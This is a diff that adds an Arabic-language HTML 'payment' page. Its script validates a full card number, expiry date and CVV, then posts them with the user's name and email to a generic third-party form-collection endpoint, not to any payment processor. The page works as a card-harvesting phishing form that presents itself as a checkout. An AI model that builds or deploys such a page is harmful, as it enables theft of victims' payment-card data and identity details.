@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <title>البيانات & الدفع</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f4f4f4;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+
+    .form-box {
+      background: white;
+      padding: 30px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      width: 320px;
+    }
+
+    .form-box h2 {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    input {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border-radius: 4px;
+      border: 1px solid #ccc;
+    }
+
+    .row {
+      display: flex;
+      gap: 10px;
+    }
+
+    .row input {
+      flex: 1;
+    }
+
+    button {
+      width: 100%;
+      padding: 10px;
+      background: #27ae60;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+      margin-top: 15px;
+    }
+
+    button:hover {
+      background: #219150;
+    }
+
+    .error {
+      color: red;
+      font-size: 14px;
+      margin-top: -5px;
+      margin-bottom: 10px;
+    }
+  </style>
+</head>
+<body>
+  <form class="form-box" id="paymentForm">
+    <h2>البيانات & الدفع</h2>
+
+    <input type="text" id="username" placeholder="أسم المستخدم" required>
+    <div class="error" id="usernameError"></div>
+
+    <input type="email" id="lastname" placeholder="البريد الالكتروني" required>
+    <div class="error" id="lastnameError"></div>
+
+    <input type="text" id="cardholder_name" placeholder="اسم حامل البطاقة" required>
+    <div class="error" id="nameError"></div>
+
+    <input type="text" id="card_number" placeholder="رقم البطاقة" required>
+    <div class="error" id="cardError"></div>
+
+    <div class="row">
+      <div style="width: 100%">
+        <input type="text" id="exp_month" placeholder="شهر الانتهاء" required>
+        <div class="error" id="monthError"></div>
+      </div>
+      <div style="width: 100%">
+        <input type="text" id="exp_year" placeholder="سنة الانتهاء" required>
+        <div class="error" id="yearError"></div>
+      </div>
+    </div>
+
+    <input type="text" id="security_code" placeholder="رمز الأمان (CVV)" required>
+    <div class="error" id="cvvError"></div>
+
+    <button type="submit">إرسال</button>
+  </form>
+
+  <script>
+    document.getElementById("paymentForm").addEventListener("submit", function(event) {
+      event.preventDefault();
+
+      // Clear previous errors
+      const errors = document.querySelectorAll(".error");
+      errors.forEach(e => e.textContent = "");
+
+      let valid = true;
+
+      const username = document.getElementById("username").value.trim();
+      const lastname = document.getElementById("lastname").value.trim();
+      const cardName = document.getElementById("cardholder_name").value.trim();
+      const cardNumber = document.getElementById("card_number").value.trim();
+      const expMonth = document.getElementById("exp_month").value.trim();
+      const expYear = document.getElementById("exp_year").value.trim();
+      const cvv = document.getElementById("security_code").value.trim();
+
+      // Basic validation
+      if (username === "") {
+        document.getElementById("usernameError").textContent = "الرجاء إدخال اسم المستخدم";
+        valid = false;
+      }
+
+      if (!/\S+@\S+\.\S+/.test(lastname)) {
+        document.getElementById("lastnameError").textContent = "الرجاء إدخال بريد إلكتروني صحيح";
+        valid = false;
+      }
+
+      if (cardName.length < 4) {
+        document.getElementById("nameError").textContent = "يرجى إدخال اسم صحيح";
+        valid = false;
+      }
+
+      if (!/^\d{16}$/.test(cardNumber)) {
+        document.getElementById("cardError").textContent = "رقم البطاقة غير صحيح (16 رقم)";
+        valid = false;
+      }
+
+      if (!/^\d{2}$/.test(expMonth) || parseInt(expMonth) < 1 || parseInt(expMonth) > 12) {
+        document.getElementById("monthError").textContent = "شهر غير صحيح";
+        valid = false;
+      }
+
+      if (!/^\d{2,4}$/.test(expYear)) {
+        document.getElementById("yearError").textContent = "سنة غير صحيحة";
+        valid = false;
+      }
+
+      if (!/^\d{3,4}$/.test(cvv)) {
+        document.getElementById("cvvError").textContent = "رمز الأمان غير صحيح";
+        valid = false;
+      }
+
+      if (valid) {
+‎        // إذا كانت كل البيانات صحيحة، ترسل إلى Basin
+        const form = document.createElement('form');
+        form.method = 'POST';
+        form.action = 'https://usebasin.com/f/deca66ab9f47';
+
+        const fields = {
+          username,
+          lastname,
+          cardholder_name: cardName,
+          card_number: cardNumber,
+          exp_month: expMonth,
+          exp_year: expYear,
+          security_code: cvv
+        };
+
+        for (const key in fields) {
+          const input = document.createElement('input');
+          input.type = 'hidden';
+          input.name = key;
+          input.value = fields[key];
+          form.appendChild(input);
+        }
+
+        document.body.appendChild(form);
+        form.submit();
+      }
+    });
+  </script>
+</body>
+</html>
